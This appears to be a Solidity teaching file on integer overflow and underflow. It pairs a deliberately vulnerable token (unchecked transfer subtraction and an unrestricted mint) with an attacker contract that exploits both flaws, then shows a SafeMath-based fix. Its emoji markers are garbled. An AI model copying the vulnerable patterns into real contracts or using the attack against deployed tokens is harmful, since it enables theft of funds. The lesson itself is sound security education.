// ‚ùå VULNERABLE: OVERFLOW/UNDERFLOW EXAMPLE
// ==========================================

//fix must use ssafemath library to make accurate and safe calculations can do these on ur own makesure u use good safe libraries to make calculations
//same with underflow
contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        balances[msg.sender] = 100; // Start with 100 tokens
        totalSupply = 100;
    }

    //must use sa
    // üö® UNDERFLOW: Can wrap around to huge number
    function transfer(address to, uint256 amount) public {
        // If you have 50 tokens and transfer 100:
        // 50 - 100 = wraps to 115792089237316195423570985008687907853269984665640564039457584007913129639935
        balances[msg.sender] -= amount; // ‚ö†Ô∏è VULNERABLE
        balances[to] += amount;
    }

    // üö® OVERFLOW: Can wrap back to zero
    function mint(uint256 amount) public {
        // If totalSupply is near max uint256 and you add more:
        // It wraps back to 0!
        totalSupply += amount; // ‚ö†Ô∏è VULNERABLE
        balances[msg.sender] += amount;
    }
}

// ==========================================
// üè¥‚Äç‚ò†Ô∏è ATTACKER CONTRACT
// ==========================================

contract OverflowAttacker {
    VulnerableToken public vulnerableToken;

    constructor(address _vulnerableToken) {
        vulnerableToken = VulnerableToken(_vulnerableToken);
    }

    // ATTACK #1: Underflow exploit
    function attackUnderflow() public {
        // Attacker has 0 tokens
        // Transfer 1 token: 0 - 1 = MAX_UINT256
        vulnerableToken.transfer(address(this), 1);
        // Now attacker has 2^256 - 1 tokens! üí∞
    }

    // ATTACK #2: Overflow exploit
    function attackOverflow() public {
        // Mint huge amount to cause totalSupply to overflow
        uint256 hugeAmount = type(uint256).max;
        vulnerableToken.mint(hugeAmount);
        // totalSupply wraps back to small number!
    }

    function getMyBalance() public view returns (uint256) {
        return vulnerableToken.balances(address(this));
    }
}

// ==========================================
// ‚úÖ FIX #1: Use SafeMath (for Solidity < 0.8)
// ==========================================

library SafeMath {
    // Safe addition - reverts on overflow
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    // Safe subtraction - reverts on underflow
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction underflow");
        return a - b;
    }
}

contract SafeTokenWithLibrary {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        balances[msg.sender] = 100;
        totalSupply = 100;
    }

    // ‚úÖ SAFE: Will revert if underflow
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] = balances[msg.sender].sub(amount); // ‚úÖ Reverts if underflow
        balances[to] = balances[to].add(amount);
    }

    // ‚úÖ SAFE: Will revert if overflow
    function mint(uint256 amount) public {
        totalSupply = totalSupply.add(amount); // ‚úÖ Reverts if overflow
        balances[msg.sender] = balances[msg.sender].add(amount);
    }
}
